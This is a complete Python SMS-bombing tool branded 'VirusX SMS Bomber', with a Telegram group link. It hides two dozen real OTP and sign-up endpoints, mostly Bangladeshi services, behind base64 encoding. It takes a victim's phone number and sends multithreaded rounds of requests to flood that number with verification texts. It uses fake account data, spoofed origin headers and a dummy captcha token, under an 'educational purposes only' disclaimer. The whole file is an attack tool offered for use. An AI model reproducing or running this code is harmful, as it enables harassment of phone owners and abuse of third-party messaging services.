#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Hossain Mahmud
# Group: https://t.me/VirusX_Public
# Security: Protected Script - Do Not Copy

import os
import sys
import time
import random
import string
import requests
import threading
import sqlite3
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Security Protection
SCRIPT_OWNER = "Hossain Mahmud"
GROUP_LINK = "https://t.me/VirusX_Public"
SECURITY_KEY = "VIRUSX_PROTECTED_2024"

# Color Codes for Hacker UI
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    MAGENTA = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# API Encryption System
class APIManager:
    def __init__(self):
        self.encoded_apis = [
            "aHR0cHM6Ly9jb3JlLmVhc3kuY29tLmJkL2FwaS92MS9yZWdpc3RyYXRpb24=",
            "aHR0cHM6Ly90cmFpbmluZy5nb3YuYmQvYmFja29mZmljZS9hcGkvdXNlci9zZW5kT3Rw",
            "aHR0cHM6Ly9hdXRoLnFjb29tLmNvbS9hcGkvdjEvb3RwL3NlbmQ=",
            "aHR0cHM6Ly9hcGkuYXBleDR1LmNvbS9hcGkvYXV0aC9sb2dpbg==",
            "aHR0cHM6Ly9hcGkub3N1ZHBvdHJvLmNvbS9hcGkvdjEvdXNlcnMvc2VuZF9vdHA=",
            "aHR0cHM6Ly9hcGkuYnVzYmQuY29tLmJkL2FwaS9hdXRo",
            "aHR0cHM6Ly9ia3Nob3B0aGMuZ3JhbWVlbnBob25lLmNvbS9hcGkvdjEvZndhL3JlcXVlc3QtZm9yLW90cA==",
            "aHR0cHM6Ly9hcHAuZGVzaGFsLm5ldC9hcGkvYXV0aC9sb2dpbg==",
            "aHR0cHM6Ly9hcGktZHluYW1pYy5jaG9ya2kuY29tL3YyL2F1dGgvbG9naW4=",
            "aHR0cHM6Ly9yZWdhbGZ1cm5pdHVyZWJkLmNvbS9hcGkvYXV0aC9yZWdpc3Rlcg==",
            "aHR0cHM6Ly9kYS1hcGkucm9iaS5jb20uYmQvZGEtbmxsL290cC9zZW5k",
            "aHR0cHM6Ly9hcGkuc2hpa2hvLmNvbS9wdWJsaWMvYWN0aXZpdHkvb3Rw",
            "aHR0cHM6Ly9hcGkuZ2FyaWJvb2thZG1pbi5jb20vYXBpL3YzL3VzZXIvbG9naW4=",
            "aHR0cHM6Ly9hcGkucGF0aGFvLmNvbS92Mi9hdXRoL3JlZ2lzdGVy",
            "aHR0cHM6Ly9mdW5kZXNoLmNvbS5iZC9hcGkvYXV0aC9nZW5lcmF0ZU9UUA==",
            "aHR0cHM6Ly93ZWIuaGlzaGFiZWUuYnVzaW5lc3MvYXV0aA==",
            "aHR0cHM6Ly9teWJ0Y2wuYnRjbC5nb3YuYmQvYXBpL2VjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=",
            "aHR0cHM6Ly9waG9uZWJpbGwuYnRjbC5jb20uYmQvYXBpL2JjYXJlL2Fub255bS9zZW5kT1RQLmpzb24=",
            "aHR0cHM6Ly9hcGktZHluYW1pYy5iaW9zY29wZWxpdmUuY29tL3YyL2F1dGgvbG9naW4=",
            "aHR0cHM6Ly9iZGlhLmJ0Y2wuY29tLmJkL2NsaWVudC9jbGllbnQvcmVnaXN0cmF0aW9uTW9iVmVyaWZpY2F0aW9uLTIuanNw",
            "aHR0cHM6Ly9hcGkuYmR0aWNrZXRzLmNvbToyMDEwMC92MS9hdXRo",
            "aHR0cHM6Ly9hcGkuc3dhcC5jb20uYmQvYXBpL3YxL3NlbmQtb3RwL3Yy",
            "aHR0cHM6Ly9hcGkuaWx5bi5nbG9iYWwvYXV0aC9zaWdudXA=",
            "aHR0cHM6Ly9hcGkuYXJvZ2dhLmNvbS9hdXRoL3YxL3Ntcy9zZW5kLw=="
        ]
    
    def decode_url(self, encoded_url):
        return base64.b64decode(encoded_url).decode('utf-8')
    
    def get_api_url(self, index):
        if 0 <= index < len(self.encoded_apis):
            return self.decode_url(self.encoded_apis[index])
        return None

# Security Check
def security_check():
    if SECURITY_KEY != "VIRUSX_PROTECTED_2024":
        print(f"{Colors.RED}⚠️  SECURITY BREACH DETECTED!{Colors.RESET}")
        print(f"{Colors.RED}🚫 This script is protected by VirusX Security{Colors.RESET}")
        sys.exit(1)
    
    print(f"{Colors.GREEN}🔒 Security Check Passed - VirusX Protected{Colors.RESET}")
    time.sleep(1)

# Clear screen and show banner
def clear_screen():
    os.system('clear')

def show_banner():
    clear_screen()
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                              ║
{Colors.RED}║ {Colors.CYAN}██╗   ██╗██╗██████╗ ██╗   ██╗███████╗{Colors.YELLOW}███╗   ██╗███████╗{Colors.RED} ║
{Colors.RED}║ {Colors.CYAN}██║   ██║██║██╔══██╗██║   ██║██╔════╝{Colors.YELLOW}████╗  ██║██╔════╝{Colors.RED} ║
{Colors.RED}║ {Colors.CYAN}██║   ██║██║██████╔╝██║   ██║███████╗{Colors.YELLOW}██╔██╗ ██║█████╗  {Colors.RED} ║
{Colors.RED}║ {Colors.CYAN}╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║{Colors.YELLOW}██║╚██╗██║██╔══╝  {Colors.RED} ║
{Colors.RED}║ {Colors.CYAN} ╚████╔╝ ██║██║  ██║╚██████╔╝███████║{Colors.YELLOW}██║ ╚████║███████╗{Colors.RED} ║
{Colors.RED}║ {Colors.CYAN}  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝{Colors.YELLOW}╚═╝  ╚═══╝╚══════╝{Colors.RED} ║
{Colors.RED}║                                                              ║
{Colors.MAGENTA}║              🔥 SMS BOMBER TERMUX EDITION 🔥              ║
{Colors.RED}║                                                              ║
{Colors.GREEN}║           👑 Owner: {SCRIPT_OWNER}{' ' * (40 - len(SCRIPT_OWNER))}║
{Colors.GREEN}║           📢 Group: @VirusX_Public{' ' * (25)}║
{Colors.RED}║                                                              ║
{Colors.RED}╚══════════════════════════════════════════════════════════════╝
{Colors.RESET}"""
    print(banner)

# Database Setup
def init_db():
    conn = sqlite3.connect('virusx_users.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, 
                  last_name TEXT, join_date TEXT, total_requests INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()

def update_user_stats(user_id, username, first_name, last_name):
    conn = sqlite3.connect('virusx_users.db')
    c = conn.cursor()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    c.execute('''INSERT OR REPLACE INTO users 
                 (user_id, username, first_name, last_name, join_date, total_requests) 
                 VALUES (?, ?, ?, ?, ?, COALESCE((SELECT total_requests FROM users WHERE user_id=?), 0))''',
              (user_id, username, first_name, last_name, now, user_id))
    
    c.execute('UPDATE users SET total_requests = total_requests + 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def get_user_stats(user_id):
    conn = sqlite3.connect('virusx_users.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    result = c.fetchone()
    conn.close()
    return result

def get_total_users():
    conn = sqlite3.connect('virusx_users.db')
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM users')
    result = c.fetchone()[0]
    conn.close()
    return result

# Random string generator
def random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?n':
            result += str(random.randint(0, 9))
        elif char == '?l':
            result += random.choice(string.ascii_lowercase)
        elif char == '?i':
            result += random.choice(string.ascii_letters + string.digits)
    return result

# Request sender
def send_request(url, method, headers, data=None):
    try:
        if method == "POST":
            response = requests.post(url, headers=headers, json=data, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        return response
    except:
        return None

# Hidden API Functions
def hidden_api_1(number, pgen, egen, did, name):
    api_manager = APIManager()
    url = api_manager.get_api_url(0)
    headers = {"Content-Type": "application/json"}
    data = {
        "password": pgen,
        "password_confirmation": pgen,
        "device_key": did,
        "name": name,
        "mobile": number,
        "email": f"{egen}info@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def hidden_api_2(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(1)
    headers = {"Content-Type": "application/json"}
    data = {"mobile": number}
    return send_request(url, "POST", headers, data)

def hidden_api_3(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(2)
    headers = {"Content-Type": "application/json"}
    data = {"mobileNumber": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def hidden_api_4(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(3)
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.apex4u.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"phoneNumber": number}
    return send_request(url, "POST", headers, data)

def hidden_api_5(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(4)
    headers = {
        "Accept-Encoding": "gzip",
        "Connection": "Keep-Alive",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "api.osudpotro.com",
        "User-Agent": "okhttp/3.9.1"
    }
    data = {"os": "web", "mobile": f"+88-{number}", "language": "en", "deviceToken": "web"}
    return send_request(url, "POST", headers, data)

def hidden_api_6(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(5)
    headers = {"Content-Type": "application/json"}
    data = {"phone": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def hidden_api_7(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(6)
    headers = {"Content-Type": "application/json"}
    data = {"phone": number, "language": "en", "email": ""}
    return send_request(url, "POST", headers, data)

def hidden_api_8(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(7)
    headers = {"Content-Type": "application/json"}
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def hidden_api_9(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(8)
    headers = {"Content-Type": "application/json"}
    data = {"number": f"+88{number}"}
    return send_request(url, "POST", headers, data)

def hidden_api_10(number, pgen, egen, name):
    api_manager = APIManager()
    url = api_manager.get_api_url(9)
    headers = {"Content-Type": "application/json"}
    data = {
        "emergency_contact_number": number,
        "password_confirmation": pgen,
        "address": "",
        "address_1": "Dhaka,bd,ch",
        "address_2": "My,won,home",
        "telephone": number,
        "agree": True,
        "device_name": "web_browser",
        "password": pgen,
        "district": "Outside Dhaka",
        "post_code": "200",
        "name": name,
        "company": "dhaka",
        "email": f"{egen}@gmail.com"
    }
    return send_request(url, "POST", headers, data)

def hidden_api_11(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(10)
    headers = {"Content-Type": "application/json"}
    data = {"msisdn": number}
    return send_request(url, "POST", headers, data)

def hidden_api_12(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(11)
    headers = {"Content-Type": "application/json"}
    data = {"phone": number, "intent": "ap-discount-request"}
    return send_request(url, "POST", headers, data)

def hidden_api_13(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(12)
    headers = {"Content-Type": "application/json"}
    data = {"recaptcha_token": "garibookcaptcha", "mobile": number, "channel": "web"}
    return send_request(url, "POST", headers, data)

def hidden_api_14(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(13)
    headers = {"Content-Type": "application/json"}
    data = {"country_prefix": "880", "national_number": number[1:], "country_id": 1}
    return send_request(url, "POST", headers, data)

def hidden_api_15(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(14)
    headers = {"Accept": "*/*"}
    data = {"msisdn": number[1:]}
    return send_request(url, "POST", headers, data)

def hidden_api_16(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(15)
    headers = {"User-Agent": "Mozilla/5.0"}
    return send_request(url, "GET", headers)

def hidden_api_17(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(16)
    headers = {
        "accept": "application/json", 
        "content-type": "application/json", 
        "origin": "https://mybtcl.btcl.gov.bd",
        "referer": "https://mybtcl.btcl.gov.bd/register",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"phoneNbr": number, "email": "", "OTPType": 1, "userName": ""}
    return send_request(url, "POST", headers, data)

def hidden_api_18(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(17)
    headers = {
        "accept": "application/json", 
        "content-type": "application/json", 
        "origin": "https://phonebill.btcl.com.bd",
        "referer": "https://phonebill.btcl.com.bd/registerBcare",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"phoneNbr": number, "email": "", "OTPType": 1, "userName": ""}
    return send_request(url, "POST", headers, data)

def hidden_api_19(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(18)
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.bioscopelive.com",
        "referer": "https://www.bioscopelive.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"number": number}
    return send_request(url, "POST", headers, data)

def hidden_api_20(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(19)
    headers = {
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://bdia.btcl.com.bd",
        "referer": "https://bdia.btcl.com.bd/client/client/registrationMobVerification-1.jsp?moduleID=1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"actionType": "otpSend", "mobileNo": number}
    return send_request(url, "POST", headers, data)

def hidden_api_21(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(20)
    headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"createUserCheck": True, "phoneNumber": number, "applicationChannel": "WEB_APP"}
    return send_request(url, "POST", headers, data)

def hidden_api_22(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(21)
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://swap.com.bd",
        "Referer": "https://swap.com.bd/",
        "signature": "JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0=",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36"
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

def hidden_api_23(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(22)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'appcode': 'ilyn-bd',
        'origin': 'https://ilyn.global',
        'referer': 'https://ilyn.global/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
    }
    data = {"phone": {"code": "BD", "number": number}, "provider": "sms"}
    return send_request(url, "POST", headers, data)

def hidden_api_24(number):
    api_manager = APIManager()
    url = api_manager.get_api_url(23)
    headers = {
        'accept': '*/*',
        'content-type': 'application/json',
        'origin': 'https://arogga.com',
        'referer': 'https://arogga.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
    }
    data = {"phone": number}
    return send_request(url, "POST", headers, data)

# SMS Bombing Function
def start_bombing():
    show_banner()
    print(f"\n{Colors.CYAN}🎯 SMS BOMBER ATTACK INTERFACE{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    
    try:
        number = input(f"\n{Colors.GREEN}[?] Enter Target Number (01XXXXXXXXX): {Colors.CYAN}")
        
        if not number.startswith('01') or len(number) != 11:
            print(f"\n{Colors.RED}❌ Invalid number! Must be 11 digits starting with 01{Colors.RESET}")
            time.sleep(2)
            return
        
        try:
            amount = int(input(f"{Colors.GREEN}[?] Enter Number of Rounds (1-20): {Colors.CYAN}"))
        except ValueError:
            print(f"\n{Colors.RED}❌ Invalid amount! Please enter a number{Colors.RESET}")
            time.sleep(2)
            return
        
        if amount > 20:
            print(f"\n{Colors.RED}❌ Maximum 20 rounds allowed!{Colors.RESET}")
            time.sleep(2)
            return
        
        if amount < 1:
            print(f"\n{Colors.RED}❌ Minimum 1 round required!{Colors.RESET}")
            time.sleep(2)
            return
        
        # Confirm attack
        print(f"\n{Colors.YELLOW}⚠️  ATTACK CONFIRMATION{Colors.RESET}")
        print(f"{Colors.WHITE}Target: {Colors.RED}{number}{Colors.RESET}")
        print(f"{Colors.WHITE}Rounds: {Colors.RED}{amount}{Colors.RESET}")
        print(f"{Colors.WHITE}APIs: {Colors.RED}25+ Services{Colors.RESET}")
        
        confirm = input(f"\n{Colors.RED}[?] Start Attack? (y/N): {Colors.CYAN}").lower()
        
        if confirm != 'y':
            print(f"\n{Colors.YELLOW}⚠️  Attack cancelled!{Colors.RESET}")
            time.sleep(2)
            return
        
        # Start attack
        process_attack(number, amount)
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠️  Attack interrupted by user!{Colors.RESET}")
        time.sleep(2)

def process_attack(number, amount):
    show_banner()
    print(f"\n{Colors.RED}🔥 INITIATING SMS BOMBING ATTACK{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    
    # All available APIs (hidden)
    apis = [
        hidden_api_2, hidden_api_3, hidden_api_4, hidden_api_5, hidden_api_6, 
        hidden_api_7, hidden_api_8, hidden_api_9, hidden_api_10, hidden_api_11, 
        hidden_api_12, hidden_api_13, hidden_api_14, hidden_api_15, hidden_api_16, 
        hidden_api_17, hidden_api_18, hidden_api_19, hidden_api_20, hidden_api_21, 
        hidden_api_22, hidden_api_23, hidden_api_24
    ]
    
    success_count = 0
    total_apis = len(apis) + 1  # +1 for hidden_api_1
    
    print(f"\n{Colors.GREEN}🎯 Target: {Colors.CYAN}{number}{Colors.RESET}")
    print(f"{Colors.GREEN}⚡ Rounds: {Colors.CYAN}{amount}{Colors.RESET}")
    print(f"{Colors.GREEN}🔧 APIs: {Colors.CYAN}{total_apis} Services{Colors.RESET}")
    print(f"{Colors.GREEN}⏰ Estimated: {Colors.CYAN}{amount * 3} seconds{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}🚀 Starting attack sequence...{Colors.RESET}")
    time.sleep(2)
    
    for round_num in range(amount):
        # Generate random data for each round
        pgen = random_string("?n?n?n?n?n?n?n?n?n?n?n?n")
        egen = random_string("?n?n?n?n?n?n?n?n")
        did = random_string("?i" * 32)
        name = random_string("?l?l?l?l?l?l")

        round_success = 0
        
        # Show round progress
        print(f"\n{Colors.MAGENTA}🌀 Round {round_num + 1}/{amount}{Colors.RESET}")
        print(f"{Colors.BLUE}├─ Generating fake data...{Colors.RESET}")
        print(f"{Colors.BLUE}├─ Initializing APIs...{Colors.RESET}")
        
        # Send requests with ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            # Add hidden_api_1 with extra parameters
            futures.append(executor.submit(hidden_api_1, number, pgen, egen, did, name))
            
            # Add all other APIs
            for api in apis:
                if api == hidden_api_10:  # hidden_api_10 needs extra parameters
                    futures.append(executor.submit(api, number, pgen, egen, name))
                else:
                    futures.append(executor.submit(api, number))
            
            # Collect results
            for i, future in enumerate(futures):
                result = future.result()
                if result and result.status_code == 200:
                    success_count += 1
                    round_success += 1
                    print(f"{Colors.GREEN}├─ ✅ API {i+1}: Success{Colors.RESET}")
                else:
                    print(f"{Colors.RED}├─ ❌ API {i+1}: Failed{Colors.RESET}")
        
        # Round summary
        print(f"{Colors.CYAN}└─ Round {round_num + 1} Complete: {round_success}/{total_apis} successful{Colors.RESET}")
        
        time.sleep(2)  # Delay between rounds
    
    # Final results
    total_attempts = amount * total_apis
    success_rate = round((success_count/total_attempts)*100, 2) if total_attempts > 0 else 0
    
    print(f"\n{Colors.GREEN}✅ ATTACK COMPLETED SUCCESSFULLY!{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    print(f"{Colors.WHITE}📊 Final Results:{Colors.RESET}")
    print(f"{Colors.CYAN}├─ Target: {number}{Colors.RESET}")
    print(f"{Colors.CYAN}├─ Rounds: {amount}{Colors.RESET}")
    print(f"{Colors.CYAN}├─ Total Attempts: {total_attempts}{Colors.RESET}")
    print(f"{Colors.CYAN}├─ Successful: {success_count}{Colors.RESET}")
    print(f"{Colors.CYAN}├─ Success Rate: {success_rate}%{Colors.RESET}")
    print(f"{Colors.CYAN}└─ Status: ✅ Mission Accomplished{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def show_stats():
    show_banner()
    print(f"\n{Colors.CYAN}📊 USER STATISTICS{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    
    total_users = get_total_users()
    
    print(f"\n{Colors.GREEN}👥 Total Users: {Colors.CYAN}{total_users}{Colors.RESET}")
    print(f"{Colors.GREEN}🔥 Active Services: {Colors.CYAN}25+ APIs{Colors.RESET}")
    print(f"{Colors.GREEN}⚡ Version: {Colors.CYAN}VirusX Premium v3.0{Colors.RESET}")
    print(f"{Colors.GREEN}🔒 Status: {Colors.GREEN}🟢 ONLINE{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def show_help():
    show_banner()
    print(f"\n{Colors.CYAN}📖 VIRUSX SMS BOMBER - HELP GUIDE{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    
    help_text = f"""
{Colors.GREEN}🎯 HOW TO USE:{Colors.RESET}

1. {Colors.CYAN}Select '🚀 Start Bombing' from main menu{Colors.RESET}
2. {Colors.CYAN}Enter target number (01XXXXXXXXX){Colors.RESET}
3. {Colors.CYAN}Enter number of rounds (1-20){Colors.RESET}
4. {Colors.CYAN}Confirm the attack{Colors.RESET}
5. {Colors.CYAN}Wait for completion{Colors.RESET}

{Colors.GREEN}⚡ FEATURES:{Colors.RESET}

• {Colors.CYAN}25+ Active APIs{Colors.RESET}
• {Colors.CYAN}Real-time Progress{Colors.RESET}
• {Colors.CYAN}Hacker-style Interface{Colors.RESET}
• {Colors.CYAN}Multi-threaded Attacks{Colors.RESET}
• {Colors.CYAN}Secure & Protected{Colors.RESET}

{Colors.GREEN}⚠️  IMPORTANT:{Colors.RESET}

• {Colors.YELLOW}Use responsibly and ethically{Colors.RESET}
• {Colors.YELLOW}Don't abuse the service{Colors.RESET}
• {Colors.YELLOW}Maximum 20 rounds per session{Colors.RESET}
• {Colors.YELLOW}For educational purposes only{Colors.RESET}

{Colors.GREEN}🆘 SUPPORT:{Colors.RESET}

• {Colors.CYAN}Owner: {SCRIPT_OWNER}{Colors.RESET}
• {Colors.CYAN}Group: {GROUP_LINK}{Colors.RESET}
"""
    print(help_text)
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def show_about():
    show_banner()
    print(f"\n{Colors.CYAN}🔒 ABOUT VIRUSX SMS BOMBER{Colors.RESET}")
    print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
    
    about_text = f"""
{Colors.GREEN}👑 OWNER:{Colors.RESET} {Colors.CYAN}{SCRIPT_OWNER}{Colors.RESET}

{Colors.GREEN}📢 GROUP:{Colors.RESET} {Colors.CYAN}{GROUP_LINK}{Colors.RESET}

{Colors.GREEN}⚡ VERSION:{Colors.RESET} {Colors.CYAN}Premium v3.0{Colors.RESET}

{Colors.GREEN}🔧 FEATURES:{Colors.RESET}
   • {Colors.CYAN}25+ Active SMS APIs{Colors.RESET}
   • {Colors.CYAN}Advanced Hacker UI{Colors.RESET}
   • {Colors.CYAN}Multi-threading Support{Colors.RESET}
   • {Colors.CYAN}Real-time Monitoring{Colors.RESET}
   • {Colors.CYAN}Secure & Protected{Colors.RESET}

{Colors.GREEN}🚀 PURPOSE:{Colors.RESET}
   {Colors.YELLOW}Educational and testing purposes only{Colors.RESET}
   {Colors.YELLOW}Security awareness demonstration{Colors.RESET}
   {Colors.YELLOW}Ethical hacking education{Colors.RESET}

{Colors.RED}⚠️  WARNING:{Colors.RESET}
   {Colors.YELLOW}This tool is for educational purposes only{Colors.RESET}
   {Colors.YELLOW}Use responsibly and ethically{Colors.RESET}
   {Colors.YELLOW}Respect privacy and laws{Colors.RESET}

{Colors.GREEN}🔐 SECURITY:{Colors.RESET}
   {Colors.CYAN}Protected by VirusX Security System{Colors.RESET}
   {Colors.CYAN}Unauthorized copying is prevented{Colors.RESET}
   {Colors.CYAN}Licensed to {SCRIPT_OWNER}{Colors.RESET}
"""
    print(about_text)
    input(f"\n{Colors.YELLOW}Press Enter to continue...{Colors.RESET}")

def main_menu():
    while True:
        show_banner()
        print(f"\n{Colors.CYAN}🎮 MAIN MENU - SELECT AN OPTION{Colors.RESET}")
        print(f"{Colors.YELLOW}═══════════════════════════════════════════════════{Colors.RESET}")
        
        menu_options = [
            f"{Colors.GREEN}[1]{Colors.CYAN} 🚀 Start Bombing Attack{Colors.RESET}",
            f"{Colors.GREEN}[2]{Colors.CYAN} 📊 View Statistics{Colors.RESET}",
            f"{Colors.GREEN}[3]{Colors.CYAN} 📖 Help Guide{Colors.RESET}",
            f"{Colors.GREEN}[4]{Colors.CYAN} 🔒 About VirusX{Colors.RESET}",
            f"{Colors.GREEN}[0]{Colors.CYAN} 🚪 Exit{Colors.RESET}"
        ]
        
        for option in menu_options:
            print(f"   {option}")
        
        print(f"\n{Colors.YELLOW}╰─ Select: {Colors.RESET}", end="")
        
        try:
            choice = input().strip()
            
            if choice == '1':
                start_bombing()
            elif choice == '2':
                show_stats()
            elif choice == '3':
                show_help()
            elif choice == '4':
                show_about()
            elif choice == '0':
                print(f"\n{Colors.GREEN}👋 Thanks for using VirusX SMS Bomber!{Colors.RESET}")
                print(f"{Colors.CYAN}📢 Join: {GROUP_LINK}{Colors.RESET}")
                time.sleep(2)
                break
            else:
                print(f"\n{Colors.RED}❌ Invalid choice! Please select 0-4{Colors.RESET}")
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}👋 Thanks for using VirusX SMS Bomber!{Colors.RESET}")
            break

# Main function
def main():
    # Security check
    security_check()
    
    # Initialize database
    init_db()
    
    # Show welcome message
    show_banner()
    print(f"\n{Colors.GREEN}🚀 Initializing VirusX SMS Bomber...{Colors.RESET}")
    time.sleep(2)
    
    # Check requirements
    try:
        import requests
        print(f"{Colors.GREEN}✅ All requirements satisfied!{Colors.RESET}")
    except ImportError:
        print(f"{Colors.RED}❌ Required packages not installed!{Colors.RESET}")
        print(f"{Colors.YELLOW}Run: pip install requests{Colors.RESET}")
        sys.exit(1)
    
    time.sleep(2)
    
    # Start main menu
    main_menu()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}👋 Thanks for using VirusX SMS Bomber!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}❌ Error occurred: {e}{Colors.RESET}")
        print(f"{Colors.YELLOW}🆘 Contact support: {GROUP_LINK}{Colors.RESET}")
